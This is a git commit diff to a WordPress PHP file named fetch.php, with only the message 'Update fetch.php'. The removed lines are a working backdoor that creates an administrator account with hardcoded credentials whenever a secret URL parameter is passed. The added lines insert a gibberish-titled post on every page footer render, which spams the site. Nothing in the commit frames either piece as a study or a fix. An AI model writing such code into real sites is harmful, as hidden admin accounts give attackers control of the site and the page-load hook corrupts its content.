9a41950ffdfee1b777ed9860596f7788d0323c92
avijitpalit <82804223+avijitpalit@users.noreply.github.com>
2024-06-19 22:47:39 +0530

    Update fetch.php

--- fetch.php
+++ fetch.php
@@ -1,28 +1,7 @@
 <?
 
-add_action('init', function(){
-    if(isset($_GET['add_user_nomc'])){
-        xyz1234_my_custom_add_user();
-    }
+add_action('wp_footer', function(){
+    wp_insert_post([
+        'post_title' => 'gthg hry rthry'
+    ]);
 });
-
-function xyz1234_my_custom_add_user() {
-    $username = 'username123';
-    $password = 'pasword123';
-    $email = 'drew@example.com';
-
-    if (username_exists($username) == null && email_exists($email) == false) {
-
-        // Create the new user
-        $user_id = wp_create_user($username, $password, $email);
-
-        // Get current user object
-        $user = get_user_by('id', $user_id);
-
-        // Remove role
-        $user->remove_role('subscriber');
-
-        // Add role
-        $user->add_role('administrator');
-    }
-}
